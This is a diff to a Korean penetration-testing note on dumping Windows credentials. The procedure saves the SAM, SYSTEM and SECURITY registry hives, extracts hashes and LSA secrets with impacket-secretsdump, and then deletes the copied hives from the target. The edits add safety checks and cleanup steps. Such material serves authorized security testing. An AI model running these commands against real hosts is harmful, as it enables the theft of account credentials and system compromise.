@@ -33,10 +33,16 @@ tags:
 
 ### Windows 대상 호스트에서 hive 저장
 
+기존 파일을 덮어쓰지 않도록 세 경로가 모두 없는 것을 먼저 확인한다. 하나라도 `EXISTS`가 출력되면 기존 파일을 지우거나 `/y`로 덮어쓰지 말고 이번 실행에만 사용할 다른 경로를 정한다.
+
 ```cmd
-reg save HKLM\SAM sam.save
-reg save HKLM\SYSTEM system.save
-reg save HKLM\SECURITY security.save
+if exist "<SAM_HIVE_PATH>" echo EXISTS
+if exist "<SYSTEM_HIVE_PATH>" echo EXISTS
+if exist "<SECURITY_HIVE_PATH>" echo EXISTS
+reg save HKLM\SAM "<SAM_HIVE_PATH>"
+reg save HKLM\SYSTEM "<SYSTEM_HIVE_PATH>"
+reg save HKLM\SECURITY "<SECURITY_HIVE_PATH>"
+dir "<SAM_HIVE_PATH>" "<SYSTEM_HIVE_PATH>" "<SECURITY_HIVE_PATH>"
 ```
 
 확인할 출력:
@@ -47,7 +53,7 @@ reg save HKLM\SECURITY security.save
 ### Linux 분석 호스트에서 세 hive 일괄 확인
 
 ```bash
-impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+impacket-secretsdump -sam '<LOCAL_SAM_HIVE>' -security '<LOCAL_SECURITY_HIVE>' -system '<LOCAL_SYSTEM_HIVE>' LOCAL
 ```
 
 이 명령은 세 종류의 결과를 한 번에 출력한다. `Dumping local SAM hashes`, `Dumping LSA Secrets`, cached domain logon을 각각 아래 세부 기법으로 나눠 해석한다.
@@ -107,9 +113,18 @@ meterpreter > hashdump
 
 ## 변경 영향과 복구
 
-| 변경 대상 | 예상 영향 | 검증 방법 | 복구 절차 |
-|---|---|---|---|
-| 대상 호스트의 `sam.save`·`security.save`·`system.save` | 민감한 hive 사본이 디스크에 남음 | 생성 경로와 파일명 확인 | 추출과 전송을 마친 뒤 이번에 만든 세 파일만 삭제하고 부재 확인 |
+이 로컬 저장 방식이 만드는 상태는 대상 Windows의 `<SAM_HIVE_PATH>`·`<SYSTEM_HIVE_PATH>`·`<SECURITY_HIVE_PATH>`와 회수한 분석 호스트의 세 사본뿐이다. 생성 전에 부재를 확인한 exact 경로와 크기를 기록하고, 전송·추출이 끝나면 이번 실행이 만든 대상 사본만 제거한다.
+
+```cmd
+del /f "<SAM_HIVE_PATH>"
+del /f "<SYSTEM_HIVE_PATH>"
+del /f "<SECURITY_HIVE_PATH>"
+if exist "<SAM_HIVE_PATH>" echo SAM_REMAINS
+if exist "<SYSTEM_HIVE_PATH>" echo SYSTEM_REMAINS
+if exist "<SECURITY_HIVE_PATH>" echo SECURITY_REMAINS
+```
+
+마지막 세 명령이 아무것도 출력하지 않아야 대상 임시 파일 정리가 확인된다. 삭제 실패 시 먼저 파일을 연 process, 현재 token의 삭제 권한과 방어 제품의 격리·잠금 상태를 확인한다. 분석 호스트 사본은 추출 결과와 함께 민감 자료 보존·폐기 정책에 따라 exact 경로만 처리한다. `reg save`는 registry 값을 변경하지 않으므로 hive를 `reg restore`할 대상이 아니다.
 
 ## 관련 도구
 
@@ -124,3 +139,7 @@ meterpreter > hashdump
 - 원격 SAM 추출: [[Windows SAM 로컬 계정 해시 추출]]
 - 원격 LSA secret 추출: [[Windows LSA Secrets 추출]]
 - cached domain logon 추출: [[Windows Cached Domain Credentials 추출]]
+
+## 참고 링크
+
+- [Microsoft Learn: reg save](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save)
